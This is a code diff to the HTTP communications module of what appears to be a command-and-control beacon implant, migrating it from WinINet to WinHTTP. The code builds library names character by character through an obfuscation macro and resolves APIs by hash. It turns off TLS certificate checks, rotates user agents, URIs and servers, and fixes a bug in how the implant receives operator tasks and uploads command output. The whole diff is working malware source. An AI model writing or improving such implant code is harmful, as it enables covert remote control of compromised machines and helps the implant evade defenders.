@@ -38,6 +38,33 @@ int _atoi(const char* str)
 }
 
 
+// Inline ASCII->UTF-16 conversion. Allocates via LocalAlloc; caller frees.
+// WinHTTP APIs take wide strings, but every string the beacon profile
+// carries is 7-bit ASCII (methods, URIs, host headers, UAs, header
+// blocks). A one-byte-per-char widening is correct and keeps the beacon
+// free of a dependency on MultiByteToWideChar.
+static WCHAR* AsciiToWide(HTTPFUNC* fn, const CHAR* src, ULONG* outLenChars)
+{
+	if (!src) {
+		if (outLenChars) *outLenChars = 0;
+		return NULL;
+	}
+	ULONG srcLen = 0;
+	while (src[srcLen]) srcLen++;
+	WCHAR* dst = (WCHAR*)fn->LocalAlloc(LPTR, (srcLen + 1) * sizeof(WCHAR));
+	if (!dst) {
+		if (outLenChars) *outLenChars = 0;
+		return NULL;
+	}
+	for (ULONG i = 0; i < srcLen; i++) {
+		dst[i] = (WCHAR)(unsigned char)src[i];
+	}
+	dst[srcLen] = 0;
+	if (outLenChars) *outLenChars = srcLen;
+	return dst;
+}
+
+
 void* ConnectorHTTP::operator new(size_t sz)
 {
 	void* p = MemAllocLocal(sz);
@@ -59,32 +86,35 @@ ConnectorHTTP::ConnectorHTTP()
 	this->functions->LoadLibraryA = ApiWin->LoadLibraryA;
 	this->functions->GetLastError = ApiWin->GetLastError;
 
-	CHAR wininet_c[12];
-	wininet_c[0]  = HdChrA('w');
-	wininet_c[1]  = HdChrA('i');
-	wininet_c[2]  = HdChrA('n');
-	wininet_c[3]  = HdChrA('i');
-	wininet_c[4]  = HdChrA('n');
-	wininet_c[5]  = HdChrA('e');
-	wininet_c[6]  = HdChrA('t');
-	wininet_c[7]  = HdChrA('.');
-	wininet_c[8]  = HdChrA('d');
-	wininet_c[9]  = HdChrA('l');
-	wininet_c[10] = HdChrA('l');
-	wininet_c[11] = HdChrA(0);
+	CHAR winhttp_c[12];
+	winhttp_c[0]  = HdChrA('w');
+	winhttp_c[1]  = HdChrA('i');
+	winhttp_c[2]  = HdChrA('n');
+	winhttp_c[3]  = HdChrA('h');
+	winhttp_c[4]  = HdChrA('t');
+	winhttp_c[5]  = HdChrA('t');
+	winhttp_c[6]  = HdChrA('p');
+	winhttp_c[7]  = HdChrA('.');
+	winhttp_c[8]  = HdChrA('d');
+	winhttp_c[9]  = HdChrA('l');
+	winhttp_c[10] = HdChrA('l');
+	winhttp_c[11] = HdChrA(0);
 
-	HMODULE hWininetModule = this->functions->LoadLibraryA(wininet_c);
-	if (hWininetModule) {
-		this->functions->InternetOpenA              = (decltype(InternetOpenA)*)              GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETOPENA);
-		this->functions->InternetConnectA           = (decltype(InternetConnectA)*)           GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETCONNECTA);
-		this->functions->HttpOpenRequestA           = (decltype(HttpOpenRequestA)*)           GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPOPENREQUESTA);
-		this->functions->HttpSendRequestA           = (decltype(HttpSendRequestA)*)           GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPSENDREQUESTA);
-		this->functions->InternetSetOptionA         = (decltype(InternetSetOptionA)*)         GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETSETOPTIONA);
-		this->functions->InternetQueryOptionA       = (decltype(InternetQueryOptionA)*)       GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETQUERYOPTIONA);
-		this->functions->HttpQueryInfoA             = (decltype(HttpQueryInfoA)*)             GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPQUERYINFOA);
-		this->functions->InternetQueryDataAvailable = (decltype(InternetQueryDataAvailable)*) GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETQUERYDATAAVAILABLE);
-		this->functions->InternetCloseHandle        = (decltype(InternetCloseHandle)*)        GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETCLOSEHANDLE);
-		this->functions->InternetReadFile           = (decltype(InternetReadFile)*)           GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETREADFILE);
+	HMODULE hWinhttpModule = this->functions->LoadLibraryA(winhttp_c);
+	if (hWinhttpModule) {
+		this->functions->WinHttpOpen               = (decltype(WinHttpOpen)*)               GetSymbolAddress(hWinhttpModule, HASH_FUNC_WINHTTPOPEN);
+		this->functions->WinHttpConnect            = (decltype(WinHttpConnect)*)            GetSymbolAddress(hWinhttpModule, HASH_FUNC_WINHTTPCONNECT);
+		this->functions->WinHttpOpenRequest        = (decltype(WinHttpOpenRequest)*)        GetSymbolAddress(hWinhttpModule, HASH_FUNC_WINHTTPOPENREQUEST);
+		this->functions->WinHttpAddRequestHeaders  = (decltype(WinHttpAddRequestHeaders)*)  GetSymbolAddress(hWinhttpModule, HASH_FUNC_WINHTTPADDREQUESTHEADERS);
+		this->functions->WinHttpSendRequest        = (decltype(WinHttpSendRequest)*)        GetSymbolAddress(hWinhttpModule, HASH_FUNC_WINHTTPSENDREQUEST);
+		this->functions->WinHttpWriteData          = (decltype(WinHttpWriteData)*)          GetSymbolAddress(hWinhttpModule, HASH_FUNC_WINHTTPWRITEDATA);
+		this->functions->WinHttpReceiveResponse    = (decltype(WinHttpReceiveResponse)*)    GetSymbolAddress(hWinhttpModule, HASH_FUNC_WINHTTPRECEIVERESPONSE);
+		this->functions->WinHttpQueryHeaders       = (decltype(WinHttpQueryHeaders)*)       GetSymbolAddress(hWinhttpModule, HASH_FUNC_WINHTTPQUERYHEADERS);
+		this->functions->WinHttpQueryDataAvailable = (decltype(WinHttpQueryDataAvailable)*) GetSymbolAddress(hWinhttpModule, HASH_FUNC_WINHTTPQUERYDATAAVAILABLE);
+		this->functions->WinHttpReadData           = (decltype(WinHttpReadData)*)           GetSymbolAddress(hWinhttpModule, HASH_FUNC_WINHTTPREADDATA);
+		this->functions->WinHttpCloseHandle        = (decltype(WinHttpCloseHandle)*)        GetSymbolAddress(hWinhttpModule, HASH_FUNC_WINHTTPCLOSEHANDLE);
+		this->functions->WinHttpSetOption          = (decltype(WinHttpSetOption)*)          GetSymbolAddress(hWinhttpModule, HASH_FUNC_WINHTTPSETOPTION);
+		this->functions->WinHttpSetTimeouts        = (decltype(WinHttpSetTimeouts)*)        GetSymbolAddress(hWinhttpModule, HASH_FUNC_WINHTTPSETTIMEOUTS);
 	}
 }
 
@@ -134,6 +164,10 @@ BOOL ConnectorHTTP::SetProfile(void* profilePtr, BYTE* beat, ULONG beatSize)
 	this->proxy_username = (CHAR*)profile.proxy_username;
 	this->proxy_password = (CHAR*)profile.proxy_password;
 
+	// WinHTTP named-proxy format differs from WinINet: pass "host:port"
+	// (no scheme prefix). WinHTTP picks CONNECT vs direct based on the
+	// target URL's scheme, so a single named-proxy string works for
+	// both HTTP and HTTPS targets.
 	if (this->proxy_type != PROXY_TYPE_NONE && profile.proxy_host != NULL) {
 		ULONG hostLen = StrLenA((CHAR*)profile.proxy_host);
 		WORD port = profile.proxy_port;
@@ -155,22 +189,8 @@ BOOL ConnectorHTTP::SetProfile(void* profilePtr, BYTE* beat, ULONG beatSize)
 		}
 		portStr[portIdx] = 0;
 
-		ULONG prefixLen = 0;
-		if (this->proxy_type == PROXY_TYPE_HTTPS) {
-			prefixLen = 8;
-		}
-		this->proxy_url = (CHAR*)this->functions->LocalAlloc(LPTR, prefixLen + hostLen + 1 + portIdx + 1);
+		this->proxy_url = (CHAR*)this->functions->LocalAlloc(LPTR, hostLen + 1 + portIdx + 1);
 		ULONG idx = 0;
-		if (this->proxy_type == PROXY_TYPE_HTTPS) {
-			this->proxy_url[idx++] = 'h';
-			this->proxy_url[idx++] = 't';
-			this->proxy_url[idx++] = 't';
-			this->proxy_url[idx++] = 'p';
-			this->proxy_url[idx++] = 's';
-			this->proxy_url[idx++] = ':';
-			this->proxy_url[idx++] = '/';
-			this->proxy_url[idx++] = '/';
-		}
 		memcpy(this->proxy_url + idx, profile.proxy_host, hostLen);
 		idx += hostLen;
 		this->proxy_url[idx++] = ':';
@@ -188,65 +208,140 @@ void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
 	ULONG attempt = 0;
 	BOOL  connected = FALSE;
 	BOOL  result = FALSE;
-	DWORD context = 0;
 
-	// Close existing handles to force new UA per call
+	// Close existing handles to force new session/connect per call.
+	// WinHTTP sessions carry per-session options (UA, proxy), and the
+	// retry loop below may try a different server/UA; a fresh session
+	// per SendData avoids stale option state.
 	if (this->hConnect) {
-		this->functions->InternetCloseHandle(this->hConnect);
+		this->functions->WinHttpCloseHandle(this->hConnect);
 		this->hConnect = NULL;
 	}
 	if (this->hInternet) {
-		this->functions->InternetCloseHandle(this->hInternet);
+		this->functions->WinHttpCloseHandle(this->hInternet);
 		this->hInternet = NULL;
 	}
 
 	while (!connected && attempt < this->server_count) {
-		DWORD dwError = 0;
-
 		if (!this->hInternet) {
 			CHAR* currentUA = this->user_agents[this->ua_index];
+			ULONG uaLen = 0;
+			WCHAR* uaW = AsciiToWide(this->functions, currentUA, &uaLen);
+
 			if (this->proxy_url != NULL) {
-				this->hInternet = this->functions->InternetOpenA(currentUA, INTERNET_OPEN_TYPE_PROXY, this->proxy_url, NULL, 0);
+				ULONG proxyLen = 0;
+				WCHAR* proxyW = AsciiToWide(this->functions, this->proxy_url, &proxyLen);
+				this->hInternet = this->functions->WinHttpOpen(
+					uaW,
+					WINHTTP_ACCESS_TYPE_NAMED_PROXY,
+					proxyW,
+					WINHTTP_NO_PROXY_BYPASS,
+					0);
+				if (proxyW) {
+					memset(proxyW, 0, (proxyLen + 1) * sizeof(WCHAR));
+					this->functions->LocalFree(proxyW);
+				}
 			}
 			else {
-				this->hInternet = this->functions->InternetOpenA(currentUA, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+				this->hInternet = this->functions->WinHttpOpen(
+					uaW,
+					WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+					WINHTTP_NO_PROXY_NAME,
+					WINHTTP_NO_PROXY_BYPASS,
+					0);
+			}
+
+			if (uaW) {
+				memset(uaW, 0, (uaLen + 1) * sizeof(WCHAR));
+				this->functions->LocalFree(uaW);
+			}
+
+			// Reasonable timeouts so a dead callback doesn't block the
+			// agent loop forever: 10s resolve/connect, 30s send/receive.
+			if (this->hInternet) {
+				this->functions->WinHttpSetTimeouts(this->hInternet, 10000, 10000, 30000, 30000);
 			}
 		}
+
 		if (this->hInternet) {
+			if (!this->hConnect) {
+				CHAR* currentHost = this->server_address[this->server_index];
+				ULONG hostLen = 0;
+				WCHAR* hostW = AsciiToWide(this->functions, currentHost, &hostLen);
+				this->hConnect = this->functions->WinHttpConnect(
+					this->hInternet,
+					hostW,
+					this->server_ports[this->server_index],
+					0);
+				if (hostW) {
+					memset(hostW, 0, (hostLen + 1) * sizeof(WCHAR));
+					this->functions->LocalFree(hostW);
+				}
+			}
 
-			if (!this->hConnect)
-				this->hConnect = this->functions->InternetConnectA(this->hInternet, this->server_address[this->server_index], this->server_ports[this->server_index], NULL, NULL, INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)&context);
-
-			if (this->hConnect)
-			{
-				CHAR acceptTypes[] = { '*', '/', '*', 0 };
-				LPCSTR rgpszAcceptTypes[] = { acceptTypes, 0 };
-				DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_UI | INTERNET_FLAG_NO_COOKIES;
+			if (this->hConnect) {
+				DWORD flags = WINHTTP_FLAG_REFRESH;
 				if (this->ssl)
-					flags |= INTERNET_FLAG_SECURE;
+					flags |= WINHTTP_FLAG_SECURE;
 
 				CHAR* currentUri = this->uris[this->uri_index];
-				HINTERNET hRequest = this->functions->HttpOpenRequestA(this->hConnect, this->http_method, currentUri, 0, 0, rgpszAcceptTypes, flags, (DWORD_PTR)&context);
+				ULONG uriLen = 0, methodLen = 0;
+				WCHAR* uriW    = AsciiToWide(this->functions, currentUri, &uriLen);
+				CHAR*  effectiveMethod = (data && data_size > 0) ? (CHAR*)"POST" : this->http_method;
+				WCHAR* methodW = AsciiToWide(this->functions, effectiveMethod, &methodLen);
+
+				HINTERNET hRequest = this->functions->WinHttpOpenRequest(
+					this->hConnect,
+					methodW,
+					uriW,
+					NULL,
+					WINHTTP_NO_REFERER,
+					WINHTTP_DEFAULT_ACCEPT_TYPES,
+					flags);
+
+				if (methodW) {
+					memset(methodW, 0, (methodLen + 1) * sizeof(WCHAR));
+					this->functions->LocalFree(methodW);
+				}
+				if (uriW) {
+					memset(uriW, 0, (uriLen + 1) * sizeof(WCHAR));
+					this->functions->LocalFree(uriW);
+				}
+
 				if (hRequest) {
 					if (this->ssl) {
-						DWORD dwFlags = 0;
-						DWORD dwBuffer = sizeof(DWORD);
-						result = this->functions->InternetQueryOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, &dwBuffer);
-						if (!result) {
-							dwFlags = 0;
-						}
-						dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_REVOCATION | SECURITY_FLAG_IGNORE_WRONG_USAGE;
-						this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
+						DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA
+							| SECURITY_FLAG_IGNORE_CERT_CN_INVALID
+							| SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
+							| SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
+						this->functions->WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));
 					}
 
 					if (this->proxy_type != PROXY_TYPE_NONE && this->proxy_username != NULL) {
-						this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_PROXY_USERNAME, this->proxy_username, StrLenA(this->proxy_username));
+						ULONG puLen = 0;
+						WCHAR* puW = AsciiToWide(this->functions, this->proxy_username, &puLen);
+						if (puW) {
+							this->functions->WinHttpSetOption(hRequest, WINHTTP_OPTION_PROXY_USERNAME, puW, puLen * sizeof(WCHAR));
+							memset(puW, 0, (puLen + 1) * sizeof(WCHAR));
+							this->functions->LocalFree(puW);
+						}
 						if (this->proxy_password != NULL) {
-							this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_PROXY_PASSWORD, this->proxy_password, StrLenA(this->proxy_password));
+							ULONG ppLen = 0;
+							WCHAR* ppW = AsciiToWide(this->functions, this->proxy_password, &ppLen);
+							if (ppW) {
+								this->functions->WinHttpSetOption(hRequest, WINHTTP_OPTION_PROXY_PASSWORD, ppW, ppLen * sizeof(WCHAR));
+								memset(ppW, 0, (ppLen + 1) * sizeof(WCHAR));
+								this->functions->LocalFree(ppW);
+							}
 						}
 					}
 
-					// Build request headers with optional Host header
+					// Build the additional-headers block. WinHTTP's
+					// WinHttpSendRequest sets Content-Length automatically
+					// for ANY method when a non-zero body length is passed,
+					// which is why this connector no longer needs the
+					// explicit Content-Length workaround that the WinINet
+					// path required for GET-with-body.
 					CHAR* reqHeaders = this->headers;
 					CHAR* tmpHeaders = NULL;
 					if (this->hh_count > 0) {
@@ -303,61 +398,103 @@ void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
 						reqHeaders = tmpHeaders;
 					}
 
-					connected = this->functions->HttpSendRequestA(hRequest, reqHeaders, (DWORD)StrLenA(reqHeaders), (LPVOID)data, (DWORD)data_size);
+					ULONG hdrLenChars = 0;
+					WCHAR* hdrW = AsciiToWide(this->functions, reqHeaders, &hdrLenChars);
 
+					connected = this->functions->WinHttpSendRequest(
+						hRequest,
+						hdrW,
+						hdrLenChars,
+						(LPVOID)data,
+						data_size,
+						data_size,
+						0);
+
+					if (hdrW) {
+						memset(hdrW, 0, (hdrLenChars + 1) * sizeof(WCHAR));
+						this->functions->LocalFree(hdrW);
+					}
 					if (tmpHeaders) {
 						memset(tmpHeaders, 0, StrLenA(tmpHeaders));
 						this->functions->LocalFree(tmpHeaders);
 					}
+
 					if (connected) {
-						char statusCode[255];
-						DWORD statusCodeLenght = 255;
-						BOOL result = this->functions->HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE, statusCode, &statusCodeLenght, 0);
+						connected = this->functions->WinHttpReceiveResponse(hRequest, NULL);
+					}
 
-						if (result && _atoi(statusCode) == 200) {
+					if (connected) {
+						DWORD statusCode = 0;
+						DWORD statusSize = sizeof(statusCode);
+						result = this->functions->WinHttpQueryHeaders(
+							hRequest,
+							WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+							WINHTTP_HEADER_NAME_BY_INDEX,
+							&statusCode,
+							&statusSize,
+							WINHTTP_NO_HEADER_INDEX);
+
+						if (result && statusCode == 200) {
+							// Try Content-Length first; fall back to
+							// chunked read when the server omits it.
 							DWORD answerSize = 0;
-							DWORD dwLengthDataSize = sizeof(DWORD);
-							result = this->functions->HttpQueryInfoA(hRequest, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &answerSize, &dwLengthDataSize, NULL);
+							DWORD contentLenSize = sizeof(answerSize);
+							BOOL haveCL = this->functions->WinHttpQueryHeaders(
+								hRequest,
+								WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER,
+								WINHTTP_HEADER_NAME_BY_INDEX,
+								&answerSize,
+								&contentLenSize,
+								WINHTTP_NO_HEADER_INDEX);
 
-							if (result) {
-								DWORD dwNumberOfBytesAvailable = 0;
-								result = this->functions->InternetQueryDataAvailable(hRequest, &dwNumberOfBytesAvailable, 0, 0);
-
-								if (result && answerSize > 0) {
-									ULONG numberReadedBytes = 0;
-									DWORD readedBytes = 0;
-									BYTE* buffer = (BYTE*)this->functions->LocalAlloc(LPTR, answerSize);
-
-									while (numberReadedBytes < answerSize) {
-										result = this->functions->InternetReadFile(hRequest, buffer + numberReadedBytes, dwNumberOfBytesAvailable, &readedBytes);
-										if (!result || !readedBytes) {
-											break;
-										}
-										numberReadedBytes += readedBytes;
-									}
-									this->recvSize = numberReadedBytes;
-									this->recvData = buffer;
-								}
-							}
-							else if (this->functions->GetLastError() == ERROR_HTTP_HEADER_NOT_FOUND) {
+							if (haveCL && answerSize > 0) {
 								ULONG numberReadedBytes = 0;
-								DWORD readedBytes = 0;
-								BYTE* buffer = (BYTE*)this->functions->LocalAlloc(LPTR, 0);
-								DWORD dwNumberOfBytesAvailable = 0;
-
-								while (1) {
-									result = this->functions->InternetQueryDataAvailable(hRequest, &dwNumberOfBytesAvailable, 0, 0);
-									if (!result || !dwNumberOfBytesAvailable)
-										break;
-
-									buffer = (BYTE*)this->functions->LocalReAlloc(buffer, dwNumberOfBytesAvailable + numberReadedBytes, LMEM_MOVEABLE);
-									result = this->functions->InternetReadFile(hRequest, buffer + numberReadedBytes, dwNumberOfBytesAvailable, &readedBytes);
-									if (!result || !readedBytes) {
+								BYTE* buffer = (BYTE*)this->functions->LocalAlloc(LPTR, answerSize);
+								// Ask WinHttpReadData for the remaining Content-Length bytes each
+								// iteration. The previous code gated the read on WinHttpQueryDataAvailable:
+								// for a small response that raced the socket buffer, the pre-call
+								// returned 0, the loop broke, and recvSize stayed 0 forever. The
+								// server dutifully returns 47-59 byte task deliveries that the
+								// beacon then never sees, so no command runs and no output is uploaded.
+								// WinHttpReadData blocks for data to arrive; Content-Length is
+								// authoritative.
+								while (numberReadedBytes < answerSize) {
+									DWORD toRead = answerSize - numberReadedBytes;
+									DWORD readedBytes = 0;
+									if (!this->functions->WinHttpReadData(hRequest, buffer + numberReadedBytes, toRead, &readedBytes) || readedBytes == 0) {
 										break;
 									}
 									numberReadedBytes += readedBytes;
 								}
-
+								this->recvSize = numberReadedBytes;
+								this->recvData = buffer;
+							}
+							else {
+								// No Content-Length (chunked or
+								// connection-closed framing): read via a
+								// fixed-size buffer. WinHttpReadData blocks
+								// for data, so we iterate until it reports
+								// zero bytes (framing complete / socket
+								// closed). The previous WinHttpQueryDataAvailable
+								// pre-check had the same race as the CL path:
+								// for a small chunked response, avail==0 on
+								// the first query made us break with
+								// recvSize=0 and lose the body.
+								const DWORD kReadChunk = 4096;
+								ULONG numberReadedBytes = 0;
+								ULONG capacity = kReadChunk;
+								BYTE* buffer = (BYTE*)this->functions->LocalAlloc(LPTR, capacity);
+								while (1) {
+									if (numberReadedBytes + kReadChunk > capacity) {
+										capacity = numberReadedBytes + kReadChunk;
+										buffer = (BYTE*)this->functions->LocalReAlloc(buffer, capacity, LMEM_MOVEABLE);
+									}
+									DWORD readedBytes = 0;
+									if (!this->functions->WinHttpReadData(hRequest, buffer + numberReadedBytes, kReadChunk, &readedBytes) || readedBytes == 0) {
+										break;
+									}
+									numberReadedBytes += readedBytes;
+								}
 								if (numberReadedBytes) {
 									this->recvSize = numberReadedBytes;
 									this->recvData = buffer;
@@ -368,35 +505,29 @@ void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
 							}
 						}
 					}
-					else {
-						dwError = this->functions->GetLastError();
-					}
-					this->functions->InternetCloseHandle(hRequest);
+
+					this->functions->WinHttpCloseHandle(hRequest);
 				}
 			}
 
 			attempt++;
 			if (!connected) {
 				if (this->hConnect) {
-					this->functions->InternetCloseHandle(this->hConnect);
+					this->functions->WinHttpCloseHandle(this->hConnect);
 					this->hConnect = NULL;
 				}
 				if (this->hInternet) {
-					this->functions->InternetCloseHandle(this->hInternet);
+					this->functions->WinHttpCloseHandle(this->hInternet);
 					this->hInternet = NULL;
 				}
-
-				this->functions->InternetSetOptionA(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
-				this->functions->InternetSetOptionA(NULL, INTERNET_OPTION_REFRESH, NULL, 0);
-
 				this->server_index = (this->server_index + 1) % this->server_count;
 			}
-
 		}
 	}
 
-	// Rotate indices for next callback (active round-robin) — once per call,
-	// after the retry loop, so the failover increment above is not undone.
+	// Rotate indices for next callback (active round-robin) — once per
+	// call, after the retry loop, so the failover increment above is not
+	// undone.
 	if (this->rotation_mode == 1) {
 		this->uri_index = GenerateRandom32() % this->uri_count;
 		this->ua_index = GenerateRandom32() % this->ua_count;
@@ -463,6 +594,12 @@ void ConnectorHTTP::CloseConnector()
 	this->functions->LocalFree(this->headers);
 	this->headers = NULL;
 
-	this->functions->InternetCloseHandle(this->hInternet);
-	this->functions->InternetCloseHandle(this->hConnect);
+	if (this->hConnect) {
+		this->functions->WinHttpCloseHandle(this->hConnect);
+		this->hConnect = NULL;
+	}
+	if (this->hInternet) {
+		this->functions->WinHttpCloseHandle(this->hInternet);
+		this->hInternet = NULL;
+	}
 }
